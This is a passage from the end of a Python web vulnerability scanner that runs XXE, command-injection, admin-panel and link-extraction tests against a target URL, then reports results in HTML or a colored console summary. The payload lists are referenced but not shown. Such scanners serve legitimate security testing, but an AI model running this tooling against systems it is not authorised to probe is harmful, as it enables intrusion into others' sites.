             test_kwargs['payload_list'] = xxe_payloads
        elif test_func == test_command_injection: 
             test_kwargs['payload_list'] = cmd_injection_payloads

        
        elif test_func == identify_admin_panels:
             if all_extracted_links is not None:
                  test_kwargs['all_links'] = all_extracted_links
        
        
        if args.data_url:
             test_kwargs['data_url'] = args.data_url
       
        run_test(test_func, target_url, **test_kwargs)
        
        
        if test_func == extract_all_links:
             try:
                  
                  link_result = next((item for item in test_results_data if item.get("test_name") == "Extract All Links"), None)
                  if link_result and 'extracted_links' in link_result:
                       all_extracted_links = link_result['extracted_links']
                       log_info(f"Cached {len(all_extracted_links)} extracted links for potential use.")
             except Exception as e:
                  log_error(f"Error caching extracted links: {e}")
        
        time.sleep(args.delay) 

    
    if args.output:
        generate_html_report(args.output, target_url, test_results_data)
    else:
        
        print("\n--- Scan Summary ---")
        overall_vulnerable = any(r.get('is_vulnerable') for r in test_results_data)
        status_overall = COLOR_RED if overall_vulnerable else COLOR_GREEN
        print(f"Overall Status: [{status_overall}{'VULNERABLE' if overall_vulnerable else 'SAFE'}{COLOR_RESET}]")
        for result in test_results_data:
            status_color = COLOR_RED if result.get('is_vulnerable') else COLOR_GREEN
            print(f"[{status_color}{'VULNERABLE' if result.get('is_vulnerable') else 'SAFE'}{COLOR_RESET}] {result['test_name']}: {result['status']}")

if __name__ == '__main__':
    parser = setup_argument_parser()
    args = parser.parse_args()
    main(args)
